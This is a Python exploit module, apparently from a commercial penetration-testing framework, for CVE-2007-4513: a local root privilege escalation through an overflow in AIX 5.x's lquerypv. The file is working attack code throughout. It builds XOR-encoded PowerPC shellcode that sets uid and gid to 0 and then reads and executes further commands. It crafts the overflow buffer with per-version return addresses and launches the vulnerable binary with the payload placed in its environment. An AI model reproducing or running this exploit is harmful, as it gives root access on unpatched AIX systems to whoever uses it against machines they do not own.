#!/usr/bin/env python

# AIXroot is a multiheaded (HYDRA!?) local root gettermathingabob for AIX 5.x

import sys
import os
import struct

if '.' not in sys.path:
    sys.path.append('.')

from canvasexploit import canvasexploit
from exploitutils import *
from ExploitTypes.localexploit import LocalExploit

import aixShellcodeGenerator

NAME                                = 'CVE-2007-4513: lquerypv'
VERSION                             = '1.0'
DESCRIPTION                         = 'Local privilege escalation for AIX 5.x'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = 'IBM'
DOCUMENTATION['Repeatability']      = 'unlimited'
DOCUMENTATION['VersionsAffected']   = '5.X'
DOCUMENTATION['CVE Name']           = 'CVE-2007-4513'
DOCUMENTATION['CVE URL']            = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4513'
DOCUMENTATION['CVSS'] = 7.2

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Local'
PROPERTY['ARCH']                    = [ ['AIX', 'powerpc'] ]
PROPERTY['VERSION']                 = [ '5.X' ]

class CVE_2007_4513:
    def __init__(self, parent, target = '5.2'):
        self.description    = 'lquerypv local root'
        self.t_path         = '/usr/sbin/lquerypv'
        self.target         = target
        self.log            = parent.log
        self.fd             = parent.node.shell.fd
        
        self.versions       = { '5.1' : 0xcafebabe, 
                                '5.2' : 0x2ff22df4,
                                '5.3' : 0xcafebabe  }
        return

    def payload(self, align=2):
        sc = aixShellcodeGenerator.aix_powerpc(version = self.target)
        sc.addAttr('setuid', { 'uid' : 0 })
        sc.addAttr('setgid', { 'gid' : 0 })
        sc.addAttr('read_and_exec_loop_no_errno', { 'fd' : self.fd })
        sc.addAttr('exit', None)
        data    = sc.get()
        encoded = sc.xor_encode(data, xormask=0xae)
        self.log("Payload: %d bytes" % (len(encoded) + align))
        return 'A'*align + encoded
    
    def overflow(self):
        ovf  = 'A' * 1
        ovf += 'P' * 1034
        ovf += struct.pack('>L', 0x41414141)
        ovf += struct.pack('>L', 0x42414141)
        ovf += struct.pack('>L', self.versions[self.target])
        ovf += struct.pack('>L', 0x44414141)
        ovf += struct.pack('>L', 0x45414141)
        ovf += struct.pack('>L', 0x45414141)
        return ovf
    
    def exploit(self, node):
        """ trigger the mosdef exploit execve """

        vars            = {}
        vars['PAYLOAD'] = "%s" % self.payload()
        vars['XBUF']    = self.overflow()
        vars['TARGET']  = self.t_path
        
        code            =   """
        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "waitpid" as "waitpid"
        #import "local", "getpid" as "getpid"
        #import "local", "poll" as "poll"
        #import "local", "_exit" as "_exit"

        #import "string", "TARGET" as "TARGET"
        #import "string", "XBUF" as "XBUF"
        #import "string", "PAYLOAD" as "PAYLOAD"
        
        #include <sys/poll.h>
        
        int
        main()
        {
            char *exec[4];
            char *env[2];
            int pid;
            int status;
            struct pollfd fds;
            int ret;
            
            exec[0] = TARGET;
            exec[1] = "-V";
            exec[2] = XBUF;
            exec[3] = 0;
            
            env[0] = PAYLOAD;
            env[1] = 0;
         
            sendint(0);
            
            pid = fork();
            
            if (pid)
            {
                status  = 1;
                ret     = waitpid(&status, pid, 0);
            }
            else
            {
                execve(exec[0], exec, env);
                _exit(0);
            }
        }
        """
        
        try:
            ret = node.shell.runCode(code, vars)
        except:
            self.log("something bad happened!")
            import traceback
            traceback.print_exc(file=sys.stdout)
            return False
        
        # disable call stack errno support on stuff that mangles the stack
        node.shell.errno = False
        
        return node
    
class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = "AIXrooter exploit"
    
    def run(self):
        self.log("*** this module is used from within the AIXrooter ***")
        return False
    
